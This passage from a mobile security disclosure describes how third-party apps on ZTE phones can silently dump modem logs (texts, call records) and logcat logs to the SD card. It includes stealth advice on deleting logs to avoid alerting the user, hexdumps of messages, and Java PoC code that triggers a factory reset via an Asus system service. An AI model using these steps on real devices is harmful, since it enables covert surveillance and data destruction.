需要访问移动设备，没有提供相关步骤
日志路径固定
敏感信息有明显特征，可以通过关键词定位；敏感信息是明文，不需要解码

攻击方式：需要访问系统，还需要一定的Android开发知识才可以利用漏洞

10.	ZTE Devices – Dump Modem Logs and Logcat Logs to the SD Card
We discovered a vulnerability that allows any third-party app on the device to activate the writing of the modem and logcat logs to the SD card. This vulnerability has been present on each ZTE device we have examined with all of them were sold by US carriers. Specifically, the devices and their build fingerprints are provided below.

Verizon ZTE Blade Vantage - ZTE/Z839/sweet:7.1.1/NMF26V/20180120.095344:user/release-keys
AT&T ZTE Blade Spark - ZTE/Z971/peony:7.1.1/NMF26V/20171129.143111:user/release-keys
T-Mobile ZTE Zmax Pro - ZTE/P895T20/urd:6.0.1/MMB29M/20170418.114928:user/release-keys
Total Wireless ZTE Zmax Champ - ZTE/Z917VL/fortune:6.0.1/MMB29M/20170327.120922:user/release-keys
 

This vulnerability allows any app co-located on the device to use another app’s capabilities to obtain sensitive data that the initiating app itself lacks permission to access. An app using this vulnerability to monitor the user’s telephony behavior will require the READ_EXTERNAL_STORAGE permission. This permission allows an app to read from the device’s external storage (SD card). If the monitoring of the modem logs is to continue for an extended period of time, the attacking app should also periodically delete the logs since the aggregate size of the modem log files can start to fill up external storage. When this occurs, the user may notice a notification that indicates that the log files are taking up too much space external storage. To avoid this notification, the attacking app needs to delete old modem log files to ensure that adequate space remains so as to not potentially alert the user via a notification. The com.android.modem.service.ISdlogService interface (explained later) conveniently provides the deleteAllLog() method, so the attacking app does not need to request the WRITE_EXTERNAL_STORAGE permission. In any case, the app facilitating the modem logging functionality , com.android.modem.service (versionCode=25, versionName=7.1.1), cannot be disabled by the user. If the modem logs themselves or a file containing only parsed data from them is to be exfiltrated from the device, the attacking app should also request the INTERNET permission. The modem logs will be written to a    base    directory    of    /sdcard/sd_logs.    A    concrete    file    path    of    a    modem    log    is
/sdcard/sd_logs/sdlog_09_11_24_58.qmdl.gz. This file is a Qualcomm Extensible Monitor Log file that has been compressed using gzip. The modem log contains the raw SMS Protocol Data Units (PDUs) for sent and received text messages, including the message body, timestamp, and telephone number. In addition, the modem log contains the phone numbers for placed and received phone calls. The subsections below will be described used the ZTE Blade Vantage, although the process is the same for all ZTE devices we have examined.
10.1	ZTE – Obtaining the Modem Log Vulnerability Details
The Android OS contains a service manager that allows apps to obtain a reference to the available services on the device. The service manager resides within the system_server process. The system_server process is a critical OS process that provides necessary services to apps on the device. Apps that execute as the system user (the same user that system_server uses) have the ability to register services with the OS service manager and make them available to other apps on the device. The ZTE Blade Vantage contains a pre-installed platform app with a package name of com.android.modem.service (versionCode=25, versionName=7.1.1) that executes as the system user and registers a service named ModemService. The com.android.modem.service.ModemService class within the com.android.modem.service package explicitly registers itself with an interface class of com.android.modem.service.IModemService$Stub to the Android OS service manager. The com.android.modem.service.IModemService$Stub is provided to the Android OS service manager so that other apps can obtain a reference to this interface and use the service. Method calls on this interface will be delivered to the com.android.modem.service.ModemService class within the com.android.modem.service package. The com.android.modem.service.ModemService class itself acts as a mini service manager for services it offers within its own app (com.android.modem.service). Specifically, the IModemService interface contains 5 methods that can be called where each returns a service interface. Their method signatures are provided below, showing the method name and the service interface they return.
getAdbLogInterface() returns  com.android.modem.service.ILogService getAssistantInterface() returns  com.android.modem.service.IAssistantService getModemInterface() returns  com.android.modem.service.IModem
 

getModemRegistryInterface() returns  com.android.modem.service.IModemRegistry getSdlogInterface() returns  com.android.modem.service.ISdlogService
The attacking app first obtains a reference to the service named ModemService using Java reflection from the Android OS service manager. This retrieved service has an interface named com.android.modem.service.IModemService. Using the IModemService reference, the attacking app can call the getSdlogInterface() method exported by the IModemService interface. The getSdlogInterface() method returns another interface named com.android.modem.service.ISdlogService. Method calls made to com.android.modem.service.ISdlogService interface will be delivered to the com.android.modem.service.SdlogService class. The com.android.modem.service.ISdlogService interface contains a large number of methods for controlling the operation of the modem logging capability. In regard to making the device write the modem logs to the SD card, the following methods on the com.android.modem.service.ISdlogService interface are called in the following order: configSdlog(), enableLog(), and startLog(). At this point, the device will start writing the modem logs to a base directory with a path of /sdcard/sd_logs. Any app on the device that has permission to access the SD card, can process and parse the compressed qmdl files for the user’s telephony data. This binary file can be viewed in Qualcomm eXtensible Diagnostic Monitor Professional (QXDM Pro) or the binary qmdl file can be parsed directly for the user’s text messages and call data. Below are byte sequences in PDU format for a sent text message and a received text message, as well as a placed and received call. The PoC source code to enable the modem logs is provided in Appendix
H.	The PoC code needs to be coded into an Android app and executed on the ZTE device with an active Subscriber Identity Module (SIM) card. The examples below show the hexdump output of a binary qmdl file from ZTE where the text message PDUs and call data have been identified.
Sent text message to the phone number 7035758208 with a message of “Test. Can you text me back?”

00e89b60	e0 00 01 09 05 00 07 63	33 59 01 30 00 06 00 07	|.......c3Y.0....|
00e89b70	91 31 21 13 94 18 f0 24	01 01 0a 81 07 53 57 28	|.1!....$....E..!|
00e89b80	80 00 00 1b d4 f2 9c ee	02 0d c3 6e 50 fe 5d 07	|`..........nP.].|
00e89b90	d1 cb 78 3a a8 5d 06 89	c3 e3 f5 0f 33 6a 7e 92	|..x:.]......3j~.|
The PDU starts at the address 0x00e89b6f with a single byte with hex value of 0x07 and ends at 0x00e89b90 with the end of the message body. The text message body is in 7-bit packed encoding and the destination number is in decimal semi-octets. The number of the sender starts at address 0x00e89b7c and ends at 0x00e89b80 and is in reverse order (i.e., 07 becomes 70). The text message body starts at address 0x00e89b80 and ends at 0x00e89b90. The message “Test. Can you text me back?” converts to d4f29cee020dc36e50fe5d07d1cb783aa85d0689c3e3f50f in 7-bit packed encoding.
Received text message from the phone number 7035758208 with a message of “Sucka”

019928b0	29 00 09 01 25 01 e0 07	91 21 04 44 29 61 f6 00	|)...%....!.D)a..|
019928c0	19 04 0b 91 71 30 75 85	02 f8 00 00 81 30 11 51	|....Q.x......0.Q|
019928d0	40 34 69 06 d3 fa 78 1d	06 01 00 1b 22 7e 79 00	|@4i...x....."~y.|
The PDU starts at the address 0x019928b7 with a single byte with hex value of 0x07 and ends at 0x019928d8 with the end of the message body. The text message body is in 7-bit packed encoding and the sending number is in decimal semi-octets. The number of the sender starts at address 0x019928c4 and ends at 0x019928c8. The text message body starts at address 0x019928d4 and ends at 0x019928d8. The message “Sucka” converts to d3fa781d06 in 7-bit packed encoding. The text message also contains a timestamp
 

where that starts at 0x019928c0c and ends at 0x019928d0. This hex value of 813011514034 converts to 3:04:43pm on March 11, 2018.
Received call from the phone number 7034227613

03d3eda0	10 00 7a 01 7a 01 c1 12	17 27 37 f5 c9 6a e0 00	|..z.z....'7..j..|
03d3edb0	03 00 00 00 00 11 00 00	00 07 00 00 00 01 00 00	|................|
03d3edc0	00 00 00 00 00 37 30 33	34 32 32 37 36 31 33 66	|.....7034227613f|
03d3edd0	50 11 00 00 f0 af 68 00	90 98 00 00 80 48 69 00	|P.....h......Hi.|
03d3ede0	d0 b6 e5 ff 00 00 00 00	40 86 02 00 10 f9 ff ff	|........@.......|
Placed call to the United Airlines reservation number of 18008648331

03334a20	80 a0 70 c5 c9 6a e0 00	03 38 00 00 00 11 00 00	|..p..j...8......|
03334a30	00 06 00 00 00 01 00 00	00 00 00 00 00 31 38 30	|.............180|
03334a40	30 38 36 34 38 33 33 31	00 00 54 0e 60 34 c6 1b	|08648331..T.`4..|
03334a50	00 00 03 00 50 89 00 80	00 00 00 00 00 00 00 00	|....P...........|
03334a60	d0 06 7f 02 00 00 00 00	00 00 00 00 30 0d 28 0a	|............0.(.|

10.2	ZTE – Obtaining the Logcat Log Vulnerability Details
The logcat logs consist of four different log buffers: system, main, radio, and events. The logcat log is a shared resource where any process on the device can write a message to the log. The logcat log is generally for debugging purposes. An app can read only from the logcat logs that the app itself has written unless it has requested and been granted the READ_LOGS permission by the Android OS. The Android OS and apps can write sensitive data to the logs, so the capability to read from the system-wide logcat log was taken away from third-party apps in Android 4.1. The logcat logs tend to contain email addresses, telephone numbers, GPS coordinates, unique device identifiers, and arbitrary messages written by any process on the device. A non-exhaustive list of concrete logcat log messages is provided in Appendix B. Using this vulnerability, a third-party app can leverage another app to write the system-wide logcat logs to the SD card. App developers may write sensitive data to the logcat log while under the impression that their messages will be private and unobtainable. Information disclosure from the logcat log can be damaging depending on the nature of the data written to the log. Appendix B contains a username and password pair being written to the log in a US Fortune 500 bank’s Android app.
This vulnerability is present in the same app (com.android.modem.service) that allows the modem log to be written to the SD card. A third-party app can use the ModemService to activate the logcat logs being written to the SD card. As mentioned previously, the ModemService provides access to five different services through interfaces to these services. The com.android.modem.service.IAssistantService service interface allows any app on the device to programmatically enable the writing of the logcat logs to the SD card. The writing of the logcat logs are inactive by default, although simply enabling their logging to the SD card can be performed by an app with zero permissions. As mentioned with the modem logs, an app that wants to read from the log files on the SD card, will need to request the READ_EXTERNAL_STORAGE permission. The IAssistantService service interface is obtained by calling the getAssistantInterface() method on the IModemService interface. Method calls to the IAssistantService service interface will be delivered to the com.android.modem.service.AssistantService class. The methods exported by the IAssistantService service interface mostly cover logging functions. To enable the logcat logs being written to the SD card, the following two methods need to be called on the IAssistantService service interface: enableDeamonProcess(boolean) and enableAdbLog(Boolean), where both Boolean values as parameters to the methods have a value of true. Proof of Concept code is provided in Appendix I.
 



Once   the   logcat   logs   have   been   activated,   they   will   get   written,   by   default,   to   the
/sdcard/sd_logs/AdbLog/logcat directory. Within this directory, there are four files matching the names of the different log buffers: logcat_events.txt, logcat_main.txt, logcat_radio.txt, and logcat_system.txt. These log files are in plaintext and can be parsed for known-formats of log messages that  contain  sensitive  data.  Since  these  logs  are  written  by  default  to  a  directory  within  the
/sdcard/sd_logs directory. The same method as previously, leveraging the deleteAllLog() method from the ISdlogService method, provides a way of deleting the log files periodically


Appendix A. PoC code for Arbitrary Command Execution as the system user on the Verizon Asus ZenFone V Live Device. The Same Code Also Works on the Asus ZenFone 3 Max Device.

public void asus_zenfone_V_live_command_execution_as_system_user() { 
	Intent i = new Intent(); 
	i.setClassName("com.asus.splendidcommandagent", "com.asus.splendidcommandagent.SplendidCommandAgentService"); 
	SplendidServiceConnection servConn = new  SplendidServiceConnection(); 
	boolean  ret = bindService(i, servConn, BIND_AUTO_CREATE);
	Log.d(TAG, "initService() bound with " + ret);
}


class SplendidServiceConnection implements ServiceConnection {

	@Override
	public void onServiceConnected(ComponentName name, IBinder boundService) {
		Log.w(TAG,  "serviceConnected");
		Parcel send = Parcel.obtain();
		Parcel reply = Parcel.obtain();

		send.writeInterfaceToken("com.asus.splendidcommandagent.ISplendidCommandAgentService"); 
		String command = "am  broadcast  -a  android.intent.action.MASTER_CLEAR"; 
		send.writeString(command);
	try {
		boolean success = boundService.transact(1, send, reply, Binder.FLAG_ONEWAY); 
		Log.i(TAG, "binder   transaction   success="   + success);
	} catch  (RemoteException e) {
		e.printStackTrace();
	}
		send.recycle(); 
		reply.recycle();
	}

	@Override
	public void onServiceDisconnected(ComponentName arg0) { 
		Log.w(TAG, "onServiceConnected");
	}

}
